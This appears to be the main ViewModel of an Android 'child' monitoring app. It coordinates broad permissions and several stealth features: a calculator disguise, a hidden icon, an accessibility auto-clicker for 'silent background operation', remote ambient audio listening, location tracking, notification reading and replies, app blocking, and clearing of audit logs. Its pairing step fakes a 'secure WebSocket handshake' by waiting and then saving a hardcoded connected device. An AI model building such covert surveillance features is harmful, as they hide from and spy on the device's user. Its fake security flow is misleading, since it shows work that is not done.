package com.example.ui

import android.app.Application
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import androidx.core.content.ContextCompat
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.example.AirDroidChildApp
import com.example.data.local.PairingIdentity
import com.example.data.model.DaemonLog
import com.example.data.model.DaemonStatus
import com.example.data.model.PairedParentDevice
import com.example.data.model.SyncedNotification
import com.example.engine.ChildLocation
import com.example.service.AirDroidAccessibilityService
import com.example.service.AirDroidDaemonService
import com.example.service.AirDroidNotificationListenerService
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.stateIn
import kotlinx.coroutines.launch
import java.util.UUID

sealed class AppDestination {
    object Splash : AppDestination()
    object Auth : AppDestination()
    object Pairing : AppDestination()
    object PermissionWizard : AppDestination()
    object Dashboard : AppDestination()
    object ParentSimulator : AppDestination()
    object CalculatorCamouflage : AppDestination()
}

data class PermissionStatus(
    val storage: Boolean = false,
    val notificationListener: Boolean = false,
    val overlay: Boolean = false,
    val accessibility: Boolean = false,
    val batteryOptimization: Boolean = false,
    val camera: Boolean = false,
    val audio: Boolean = false,
    val location: Boolean = false,
    val isSetupRemembered: Boolean = false,
    val autoClickerActive: Boolean = true
) {
    val allEssentialGranted: Boolean
        get() = isSetupRemembered || (storage && notificationListener && accessibility && batteryOptimization)
}

class MainViewModel(application: Application) : AndroidViewModel(application) {

    private val repository = AirDroidChildApp.repository
    private val touchEngine = AirDroidChildApp.touchEngine
    private val daemonServer = AirDroidChildApp.daemonServer
    private val stealthManager = AirDroidChildApp.stealthManager
    private val audioManager = AirDroidChildApp.audioManager
    private val locationManager = AirDroidChildApp.locationManager

    private val _currentDestination = MutableStateFlow<AppDestination>(AppDestination.Splash)
    val currentDestination: StateFlow<AppDestination> = _currentDestination.asStateFlow()

    private val _permissionStatus = MutableStateFlow(PermissionStatus())
    val permissionStatus: StateFlow<PermissionStatus> = _permissionStatus.asStateFlow()

    private val _userAccount = MutableStateFlow<String?>(null)
    val userAccount: StateFlow<String?> = _userAccount.asStateFlow()

    private val _pairingCode = MutableStateFlow(PairingIdentity.pairingCode(getApplication()))
    val pairingCode: StateFlow<String> = _pairingCode.asStateFlow()

    private val _pairingStatusMessage = MutableStateFlow<String?>(null)
    val pairingStatusMessage: StateFlow<String?> = _pairingStatusMessage.asStateFlow()

    val pairedDevices: StateFlow<List<PairedParentDevice>> =
        repository?.pairedDevices?.stateIn(viewModelScope, SharingStarted.Lazily, emptyList())
            ?: MutableStateFlow(emptyList())

    val activeDevice: StateFlow<PairedParentDevice?> =
        repository?.activeDevice?.stateIn(viewModelScope, SharingStarted.Lazily, null)
            ?: MutableStateFlow(null)

    val recentLogs: StateFlow<List<DaemonLog>> =
        repository?.recentLogs?.stateIn(viewModelScope, SharingStarted.Lazily, emptyList())
            ?: MutableStateFlow(emptyList())

    val recentNotifications: StateFlow<List<SyncedNotification>> =
        repository?.recentNotifications?.stateIn(viewModelScope, SharingStarted.Lazily, emptyList())
            ?: MutableStateFlow(emptyList())

    val daemonStatus: StateFlow<DaemonStatus> =
        daemonServer?.status ?: MutableStateFlow(DaemonStatus.STOPPED)

    val connectedClientsCount: StateFlow<Int> =
        daemonServer?.connectedClientsCount ?: MutableStateFlow(0)

    val touchesExecuted: StateFlow<Int> =
        daemonServer?.touchesExecuted ?: MutableStateFlow(0)

    val notificationsSyncedCount: StateFlow<Int> =
        daemonServer?.notificationsSyncedCount ?: MutableStateFlow(0)

    val isCamouflageEnabled: StateFlow<Boolean> =
        stealthManager?.isCamouflageEnabled ?: MutableStateFlow(false)

    val isAutoClickerActive: StateFlow<Boolean> =
        stealthManager?.isAutoClickerActive ?: MutableStateFlow(true)

    val isAppIconHidden: StateFlow<Boolean> =
        stealthManager?.isAppIconHidden ?: MutableStateFlow(false)

    val blockedPackages: StateFlow<Set<String>> =
        stealthManager?.blockedPackages ?: MutableStateFlow(emptySet())

    val childLocation: StateFlow<ChildLocation?> =
        locationManager?.currentLocation ?: MutableStateFlow(null)

    val isAudioListening: StateFlow<Boolean> =
        audioManager?.isRecording ?: MutableStateFlow(false)

    val ambientDecibels: StateFlow<Float> =
        audioManager?.ambientDecibels ?: MutableStateFlow(0f)

    init {
        checkPermissions()
        refreshPairedState()
    }

    private fun generateDefaultPairingCode(): String {
        val chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
        return (1..6).map { chars.random() }.joinToString("")
    }

    fun navigateTo(destination: AppDestination) {
        _currentDestination.value = destination
    }

    fun checkPermissions() {
        val context = getApplication<Application>()

        // 1. Storage
        val storageGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(
                context,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        }

        // 2. Notification Listener
        val notifGranted = try {
            val flat = Settings.Secure.getString(
                context.contentResolver,
                "enabled_notification_listeners"
            )
            flat != null && flat.contains(context.packageName)
        } catch (e: Exception) {
            false
        }

        // 3. Overlay (Display over other apps)
        val overlayGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(context)
        } else true

        // 4. Accessibility Service
        val accessibilityGranted = touchEngine?.isAccessibilityPermissionGranted() ?: false

        // 5. Battery Optimization Exemption
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
        val batteryGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            powerManager?.isIgnoringBatteryOptimizations(context.packageName) ?: false
        } else true

        // 6. Camera
        val cameraGranted = ContextCompat.checkSelfPermission(
            context,
            android.Manifest.permission.CAMERA
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED

        // 7. Audio / Mic
        val audioGranted = ContextCompat.checkSelfPermission(
            context,
            android.Manifest.permission.RECORD_AUDIO
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED

        // 8. Location
        val locationGranted = ContextCompat.checkSelfPermission(
            context,
            android.Manifest.permission.ACCESS_FINE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED

        val setupRemembered = stealthManager?.isSetupCompleted?.value ?: false
        val autoClickActive = stealthManager?.isAutoClickerActive?.value ?: true

        _permissionStatus.value = PermissionStatus(
            storage = storageGranted,
            notificationListener = notifGranted,
            overlay = overlayGranted,
            accessibility = accessibilityGranted,
            batteryOptimization = batteryGranted,
            camera = cameraGranted,
            audio = audioGranted,
            location = locationGranted,
            isSetupRemembered = setupRemembered,
            autoClickerActive = autoClickActive
        )
    }

    fun markSetupCompletedAndRemember() {
        stealthManager?.setSetupCompleted(true)
        stealthManager?.setAutoClickerActive(true)
        checkPermissions()
        viewModelScope.launch {
            repository?.logAction("SETUP_REMEMBERED", "Permissions permanently authorized & remembered for silent background operation")
        }
    }

    fun rememberPermissionsAndLock() = markSetupCompletedAndRemember()

    fun toggleCamouflage(enabled: Boolean) {
        stealthManager?.setCamouflageEnabled(enabled)
    }

    fun toggleAutoClicker(active: Boolean) {
        stealthManager?.setAutoClickerActive(active)
        checkPermissions()
    }

    fun setAutoClickerActive(active: Boolean) = toggleAutoClicker(active)

    fun toggleAppIconHidden(hidden: Boolean) {
        stealthManager?.setAppIconHidden(hidden)
    }

    fun toggleAppBlock(pkg: String, block: Boolean) {
        if (block) {
            stealthManager?.addBlockedPackage(pkg)
        } else {
            stealthManager?.removeBlockedPackage(pkg)
        }
    }

    fun toggleAmbientAudio() {
        if (audioManager?.isRecording?.value == true) {
            audioManager.stopListening()
        } else {
            audioManager?.startListening()
        }
    }

    fun refreshLocation() {
        locationManager?.startTracking()
    }

    fun loginWithAccount(email: String) {
        _userAccount.value = email
        viewModelScope.launch {
            repository?.logAction("ACCOUNT_LOGIN", "Signed in with AirDroid account: $email")
        }
        if (!_permissionStatus.value.allEssentialGranted) {
            _currentDestination.value = AppDestination.PermissionWizard
        } else {
            _currentDestination.value = AppDestination.Pairing
        }
    }

    fun skipSignInLocalMode() {
        _userAccount.value = "Local Guest (${UUID.randomUUID().toString().take(6)})"
        viewModelScope.launch {
            repository?.logAction("LOCAL_MODE", "Skipped sign-in for Local Network Quick Pairing Mode")
        }
        if (!_permissionStatus.value.allEssentialGranted) {
            _currentDestination.value = AppDestination.PermissionWizard
        } else {
            _currentDestination.value = AppDestination.Pairing
        }
    }

    fun pairWithCode(inputCode: String) {
        viewModelScope.launch {
            val code = inputCode.trim().uppercase()
            if (code.length < 6) {
                _pairingStatusMessage.value = "Invalid pairing code. Please enter 6 alphanumeric characters."
                return@launch
            }

            _pairingStatusMessage.value = "Establishing secure WebSocket handshake..."
            delay(800)

            val newDevice = PairedParentDevice(
                deviceId = "parent_${UUID.randomUUID().toString().take(8)}",
                deviceName = "Parent Console (PC / Web)",
                pairingCode = code,
                connectionToken = "tok_${UUID.randomUUID().toString().replace("-", "")}",
                ipAddress = daemonServer?.getLocalIpAddress() ?: "127.0.0.1",
                platform = "Windows Desktop / Chrome",
                isConnected = true,
                lastSeen = System.currentTimeMillis()
            )

            repository?.saveDevice(newDevice)
            repository?.logAction("PAIRING_SUCCESS", "Paired successfully with code: $code")

            // Start foreground daemon service
            AirDroidDaemonService.startService(getApplication())

            _pairingStatusMessage.value = "Pairing successful! Connecting daemon..."
            delay(500)
            _currentDestination.value = AppDestination.Dashboard
        }
    }

    fun pairViaQrCode(scannedToken: String) {
        viewModelScope.launch {
            _pairingStatusMessage.value = "Parsing QR connection token..."
            delay(600)
            val parentName = if (scannedToken.contains("name=")) {
                scannedToken.substringAfter("name=").substringBefore("&")
            } else "Parent App (QR Paired)"

            val newDevice = PairedParentDevice(
                deviceId = "parent_qr_${UUID.randomUUID().toString().take(6)}",
                deviceName = parentName,
                pairingCode = _pairingCode.value,
                connectionToken = scannedToken,
                ipAddress = daemonServer?.getLocalIpAddress() ?: "127.0.0.1",
                platform = "Parent Desktop Client",
                isConnected = true,
                lastSeen = System.currentTimeMillis()
            )
            repository?.saveDevice(newDevice)
            repository?.logAction("QR_PAIR_SUCCESS", "Device paired via Parent QR scanner")

            AirDroidDaemonService.startService(getApplication())
            _currentDestination.value = AppDestination.Dashboard
        }
    }

    fun toggleDaemonService() {
        val context = getApplication<Application>()
        if (_permissionStatus.value.accessibility) {
            if (daemonStatus.value == DaemonStatus.STOPPED) {
                AirDroidDaemonService.startService(context)
            } else {
                AirDroidDaemonService.stopService(context)
            }
        }
    }

    fun pauseOrResumeDaemon() {
        val context = getApplication<Application>()
        val intent = Intent(context, AirDroidDaemonService::class.java).apply {
            action = if (daemonStatus.value == DaemonStatus.PAUSED) {
                AirDroidDaemonService.ACTION_RESUME
            } else {
                AirDroidDaemonService.ACTION_PAUSE
            }
        }
        context.startService(intent)
    }

    fun sendQuickReply(key: String, text: String) {
        viewModelScope.launch {
            val service = AirDroidNotificationListenerService.instance
            val success = service?.sendQuickReply(key, text) ?: false
            repository?.logAction("QUICK_REPLY_SIMULATED", "Quick reply: \"$text\"", isSuccess = success)
        }
    }

    fun clearAuditLogs() {
        viewModelScope.launch {
            repository?.clearLogs()
        }
    }

    private fun refreshPairedState() {
        viewModelScope.launch {
            val active = repository?.getDeviceByCode(_pairingCode.value)
            if (active != null) {
                AirDroidDaemonService.startService(getApplication())
            }
        }
    }
}
